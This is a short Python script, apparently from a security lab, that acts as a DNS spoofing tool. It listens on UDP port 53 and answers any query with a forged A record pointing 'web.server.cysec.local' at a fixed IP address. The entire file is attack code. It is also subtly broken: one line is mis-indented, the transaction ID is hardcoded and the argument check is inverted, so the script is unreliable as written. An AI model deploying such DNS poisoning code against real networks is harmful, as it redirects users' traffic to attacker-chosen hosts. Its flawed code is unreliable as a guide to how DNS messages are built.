#!/usr/bin/env python3
# coding: UTF-8

import sys
import socket
import struct

argvs = sys.argv
argc = len(argvs)

# TODO considering argvs
if argc != 1:
    print ('Usage: python %s  #(Poison IP Address)' % argvs[0])
    sys.exit(1)

HOST = ''       # Recieved All IP Address
URL = "web.server.cysec.local" #argvs[2]  # Request URL
Address = "216.58.197.14" # argvs[1] # Request IP Address (Google Address)
PORT = 53       # DNS Port
LEN = 512       # maxLen bits

# URL xxx.yyyy.zz
# convert -> 3xxx4yyyy2zz
def convert_dns_url():
    dns_url = ""
    url_a = URL.split(".")
    for array in url_a:
        dns_url += str(len(array))
        for c in array:
            dns_url += c

    return dns_url

def convert_16_bits(num):
    return num.to_bytes(2, 'big')

def url_dnsformat_convert():
   url = convert_dns_url()
    url_len = len(url) 
    
    format = b''
    for c in url:
        if c.isdigit():
            c = int(c)
        else:
            c = ord(c)
        format += c.to_bytes(1, 'big')

    format += b'\x00'

    return format

def ip_dnsformat_convert():
    format = b''
    address_a = Address.split(".")
    for address in address_a:
        format += int(address).to_bytes(1, 'big')

    return format

# TODO consider id number (id is random 1 ~ 65535)
# Generate DNS Request
# for a server status request, we only need a header
# header format is described in RFC 1035
def header_request(id=1):

    qr      = 1 << 15 # qr = 1      => query (response)
    opcode  = 0 << 11 # opcode = 0  => standard request
    aa      = 1 << 10
    tc      = 0 << 9
    rd      = 1 << 8
    ra      = 0 << 7
    z       = 0 << 6
    ad      = 0 << 5
    cd      = 0 << 4
    rcode   = 0 << 0

    qdcount = 1
    ancount = 1
    nscount = 0
    arcount = 0

    # convets 16bit bits array
    f1 = convert_16_bits(id)
    f2 = convert_16_bits(qr + opcode + aa + tc + rd + ra + z + ad + cd + rcode) 
    f3 = convert_16_bits(qdcount)
    f4 = convert_16_bits(ancount)
    f5 = convert_16_bits(nscount)
    f6 = convert_16_bits(arcount)

    header = f1 + f2 + f3 + f4 + f5 + f6

    return header

def question_request():
    # Refere:http://www5e.biglobe.ne.jp/%257eaji/3min/66.html
    qname = url_dnsformat_convert()

    qtype = 1   # A record

    qclass = 1  # default is 1 (InternetClass IN=1)


    # convets 16bit bits array
    f1 = qname
    f2 = convert_16_bits(qtype)
    f3 = convert_16_bits(qclass)
    
    question = f1 + f2 +f3

    return question

def answer_request():
    name    = url_dnsformat_convert()
    type    = 1     # A host address
    class_  = 1     # IN (Internet)
    ttl     = 600   # 10 minutes
    rdlen   = 4     # Data Length
    rdata   = ip_dnsformat_convert()

    
    # convets 16bit bits array
    f1 = name
    f2 = convert_16_bits(type)
    f3 = convert_16_bits(class_)
    f4 = ttl.to_bytes(4, 'big')
    f5 = convert_16_bits(rdlen)
    f6 = rdata

    answer = f1 + f2 + f3 + f4 + f5 + f6

    return answer

def main():
    # create header
    header = header_request()

    # create question
    question = question_request()

    # create answer
    answer = answer_request()

    # create DNS request message
    req = header + question + answer
    
    # display DNS request message
    print (" Request:  ", end='')
    print (req)

    # create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST,PORT))

    # receive response
    data, from_address = sock.recvfrom(LEN)

    # send the query
    sock.sendto(req, from_address)
    
    # display received data
    # data[0] => received data
    print (" Response: ", end='')
    print (data)

    print (" RCODE:    ", end='')
    rcode_format = str(len(data)) + "c"
    rcode_b = (struct.unpack(rcode_format, data)[3])
    print (int.from_bytes(rcode_b, 'big') % (1 << 4)) 


if __name__ == '__main__':
    main()

